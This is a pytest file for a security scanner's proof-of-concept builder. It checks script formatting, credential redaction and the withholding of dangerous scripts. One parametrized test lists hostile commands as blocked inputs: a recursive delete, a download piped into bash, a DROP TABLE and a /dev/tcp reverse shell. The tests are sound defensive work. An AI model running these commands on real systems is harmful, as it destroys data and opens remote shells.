"""Proof-of-concept handling: structured output, cleanup, safety and display format."""

from __future__ import annotations

import pytest

from plaidnox_sast.ai import _reproduction_fields
from plaidnox_sast.redaction import redact_script
from plaidnox_scm.poc import build_proof_of_concept


def test_structured_steps_and_script_lines_render_as_one_clean_block() -> None:
    poc = build_proof_of_concept(
        steps=["1. Sign in as an ordinary user.", "Call `/api/admin/users` with that token."],
        language="bash",
        script_lines=[
            "set -euo pipefail",
            'curl -fsS -H "Authorization: Bearer $AUTH_TOKEN" \\',
            '  "$TARGET_URL/api/admin/users"',
        ],
        expected_result="Expected result: every user is listed; a fixed build returns 403.",
    )

    assert poc.markdown() == (
        "### Steps to Reproduce\n\n"
        "1. Sign in as an ordinary user.\n"
        "2. Call `/api/admin/users` with that token.\n\n"
        "```bash\n"
        "#!/usr/bin/env bash\n"
        "set -euo pipefail\n"
        ': "${TARGET_URL:?set TARGET_URL to the application origin}"\n'
        'curl -fsS -H "Authorization: Bearer $AUTH_TOKEN" \\\n'
        '  "$TARGET_URL/api/admin/users"\n'
        "```\n\n"
        "**Expected result:** every user is listed; a fixed build returns 403."
    )


def test_legacy_single_line_output_is_split_into_real_lines() -> None:
    poc = build_proof_of_concept(
        proof_plan="1. Start the app.</n>2. Send the request.",
        proof_of_concept="`#!/usr/bin/env bash</n>set -euo pipefail</n>curl -fsS \"$TARGET_URL/x\"`",
    )

    assert poc.steps == ("Start the app.", "Send the request.")
    assert poc.script.splitlines() == [
        "#!/usr/bin/env bash",
        "set -euo pipefail",
        ': "${TARGET_URL:?set TARGET_URL to the application origin}"',
        'curl -fsS "$TARGET_URL/x"',
    ]


def test_items_holding_several_lines_and_markdown_fences_are_flattened() -> None:
    poc = build_proof_of_concept(
        language="bash", script_lines=["```bash", "echo one\\necho two", "```"], steps=["Run it."]
    )
    assert poc.script.splitlines()[1:] == ["echo one", "echo two"]


@pytest.mark.parametrize(
    ("line", "why"),
    [
        ("rm -rf /tmp/data", "deletes files"),
        ("curl -fsS https://example.invalid/x.sh | bash", "pipes a download into a shell"),
        ('curl -X DELETE "$TARGET_URL/api/users/2"', "DELETE request"),
        ("psql -c 'DROP TABLE users'", "drops data"),
        ("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "raw socket"),
    ],
)
def test_destructive_scripts_are_withheld_and_the_steps_kept(line: str, why: str) -> None:
    poc = build_proof_of_concept(language="bash", script_lines=[line], steps=["Do the thing."])

    assert poc.script == "" and poc.language == "none"
    assert why in poc.withheld_reason
    assert poc.markdown() == "### Steps to Reproduce\n\n1. Do the thing."


def test_scripts_that_do_not_parse_are_withheld() -> None:
    bash = build_proof_of_concept(language="bash", script_lines=["if [ -n x ]; then", "echo"])
    python = build_proof_of_concept(language="python", script_lines=["print(1"])

    assert bash.script == "" and "bash syntax check failed" in bash.withheld_reason
    assert python.script == "" and "Python syntax error" in python.withheld_reason


def test_http_requests_keep_their_language_and_are_not_given_a_bash_preamble() -> None:
    poc = build_proof_of_concept(
        language="http",
        script_lines=["GET /api/admin/users HTTP/1.1", "Host: TARGET_HOST", "Authorization: Bearer AUTH_TOKEN"],
    )
    assert poc.markdown() == (
        "```http\nGET /api/admin/users HTTP/1.1\nHost: TARGET_HOST\nAuthorization: Bearer AUTH_TOKEN\n```"
    )


def test_an_unsupported_finding_has_no_proof() -> None:
    assert build_proof_of_concept(language="none", script_lines=[], steps=[]).markdown() is None


def test_script_redaction_keeps_placeholders_and_only_replaces_the_secret_value() -> None:
    # Test values are built at runtime so no secret-like literal is committed.
    fake = "x" * 12
    assert redact_script("curl -H 'Cookie: idToken=$ID_TOKEN' \"$TARGET_URL\"") == (
        "curl -H 'Cookie: idToken=$ID_TOKEN' \"$TARGET_URL\""
    )
    assert redact_script(f"curl -H 'Cookie: idToken={fake}' \"$TARGET_URL\"") == (
        "curl -H 'Cookie: idToken=<redacted-credential>' \"$TARGET_URL\""
    )
    assert redact_script('AUTH_TOKEN="<your token>"') == 'AUTH_TOKEN="<your token>"'
    assert redact_script(f"-d '{{\"password\":\"{fake}\"}}'") == "-d '{\"password\":\"<redacted-credential>\"}'"
    assert redact_script(f"password={fake}&next=1") == "password=<redacted-credential>&next=1"


def test_the_model_response_parser_reads_the_structured_and_the_legacy_shapes() -> None:
    structured = _reproduction_fields(
        ["Sign in.", "2. Call it."],
        {"language": "bash", "script_lines": ["#!/usr/bin/env bash", "echo hi"], "expected_result": "hi"},
    )
    legacy = _reproduction_fields("1. Sign in.\n2. Call it.", "TARGET_URL=x\\ncurl \"$TARGET_URL\"")
    unsupported = _reproduction_fields([], {"language": "none", "script_lines": [], "expected_result": ""})

    assert structured["proof_plan"] == "1. Sign in.\n2. Call it."
    assert structured["proof_of_concept"] == "#!/usr/bin/env bash\necho hi"
    assert (structured["poc_language"], structured["poc_expected_result"]) == ("bash", "hi")
    assert legacy["proof_steps"] == ["Sign in.", "Call it."]
    assert legacy["poc_script_lines"] == ["TARGET_URL=x", 'curl "$TARGET_URL"']
    assert unsupported["proof_of_concept"] == "" and unsupported["poc_language"] == "none"
